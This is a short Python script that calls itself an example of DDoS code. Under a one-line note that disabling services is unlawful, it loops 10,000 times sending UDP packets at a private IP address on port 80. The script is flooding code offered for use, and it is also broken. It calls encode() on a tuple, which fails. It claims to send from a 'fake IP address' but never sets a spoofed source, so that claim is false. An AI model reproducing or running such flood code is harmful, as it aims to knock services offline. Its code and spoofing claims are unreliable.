# Created By: Tommie Navitskas 2023

# It is unlawful to make a service unreachable. 

# This is just an example of what DDoS coding might look like  


import socket
import random

target = '192.168.1.100'
port = 80
fake_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for _ in range(10000):
    sock.sendto((fake_ip, port).encode(), (target, port))
    print(f'Sending packet to {target} using fake IP address {fake_ip}.')
